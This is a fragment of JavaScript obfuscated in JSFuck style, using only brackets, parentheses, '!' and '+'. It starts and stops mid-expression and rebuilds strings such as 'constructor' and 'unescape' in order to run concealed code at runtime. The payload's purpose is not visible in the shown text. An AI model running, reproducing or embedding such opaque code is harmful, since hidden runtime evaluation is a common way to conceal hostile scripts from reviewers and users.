+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]